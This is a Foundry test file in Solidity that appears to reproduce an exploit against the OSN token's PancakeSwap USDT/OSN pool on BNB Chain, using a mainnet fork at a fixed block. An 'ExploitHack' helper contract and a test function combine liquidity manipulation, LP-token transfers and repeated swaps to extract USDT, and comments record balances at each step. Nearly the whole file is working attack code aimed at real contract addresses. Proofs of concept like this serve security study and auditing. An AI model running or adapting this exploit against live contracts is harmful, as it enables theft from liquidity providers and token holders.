// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";

import "./IOsn.sol";

IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant USDT_OSN_Pool = IPancakePairV2(
    0x4EEDdCc7C8714A684311F8b01154B5686A0f612f
);

IPancakePairV3 constant USDT_BTC_Pool = IPancakePairV3(
    0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4
);

IOsn constant OSN = IOsn(payable(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13));
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant BTC = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);

contract ExploitHack {
    address owner;
    uint256 LiqAmount;

    constructor() {
        OSN.approve(address(PancakeV2Router), type(uint256).max);
        USDT.approve(address(PancakeV2Router), type(uint256).max);
        USDT_OSN_Pool.approve(address(PancakeV2Router), type(uint256).max);

        owner = msg.sender;
    }

    function addLiquidity() public {
        (, , uint256 liquidity) = PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            100000, // uint256 amountADesired,
            100000, // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        LiqAmount = liquidity;
        // 44085 / 100000, 71049
    }

    function addLiq(uint256 liq) public {
        PancakeV2Router.removeLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            LiqAmount / 2, // uint256 liquidity,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );

        USDT_OSN_Pool.transfer(owner, liq);
    }

    function cc() public {
        PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            100000, // uint256 amountADesired,
            100000, // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        USDT.transfer(owner, USDT.balanceOf(address(this)));
    }
}

contract OsnTest is Test {
    uint256 helpContractAmount = 100;

    function setUp() public {
        vm.createSelectFork("bsc", 38474073);
        deal(address(USDT), address(this), 500000 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        OSN.approve(address(PancakeV2Router), type(uint256).max);
        USDT.approve(address(PancakeV2Router), type(uint256).max);
        USDT_OSN_Pool.approve(address(PancakeV2Router), type(uint256).max);

        // USDT -> OSN
        swapTokensForExactTokens(
            address(USDT),
            address(OSN),
            1 ether,
            10 ether
        );
        // print("USDT", USDT.balanceOf(address(this)), 18);
        // print("OSN", OSN.balanceOf(address(this)), 18);
        // USDT: 499999.558043549158462637
        // OSN: 0.965000000000000000

        ExploitHack helper = new ExploitHack();
        USDT.transfer(address(helper), 0.001 ether);
        OSN.transfer(address(helper), 0.001 ether);
        helper.addLiquidity();

        uint256 index = 0;
        while (index < 7) {
            swapTokensForExactTokens(
                address(USDT),
                address(OSN),
                10000 ether,
                USDT.balanceOf(address(this))
            );
            unchecked {
                index++;
            }
        }
        // print("USDT", USDT.balanceOf(address(this)), 18);
        // print("OSN", OSN.balanceOf(address(this)), 18);
        // USDT: 465812.670215194760345767
        // OSN: 67550.964000000000000000

        (, , uint256 liquidity) = PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            USDT.balanceOf(address(this)), // uint256 amountADesired,
            OSN.balanceOf(address(this)), // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        // print("liquidity", liquidity, 18);
        // liquidity: 53032.985295165061610725

        USDT_OSN_Pool.transfer(
            address(helper),
            USDT_OSN_Pool.balanceOf(address(this))
        );
        helper.addLiq(liquidity);

        PancakeV2Router.removeLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            USDT_OSN_Pool.balanceOf(address(this)), // uint256 liquidity,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        // print("USDT", USDT.balanceOf(address(this)), 18);
        // print("OSN", OSN.balanceOf(address(this)), 18);
        // print("Pair", USDT_OSN_Pool.balanceOf(address(this)), 18);
        // USDT: 464653.145613371564894745
        // OSN: 62905.146450900000000000
        // Pair: 0.000000000000000000

        index = 0;
        while (index < 10) {
            swapTokensForExactTokens(
                address(USDT),
                address(OSN),
                10000 ether,
                USDT.balanceOf(address(this))
            );
            swapExactTokensForTokensSupportingFeeOnTransferTokens(
                address(OSN),
                address(USDT),
                OSN.balanceOf(address(this))
            );
            unchecked {
                index++;
            }
        }

        helper.cc();

        print("USDT balance after", USDT.balanceOf(address(this)), 18);
    }

    function swapTokensForExactTokens(
        address tokenA,
        address tokenB,
        uint256 amountout,
        uint256 amountInMax
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        PancakeV2Router.swapTokensForExactTokens(
            amountout,
            amountInMax,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint256 amount
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
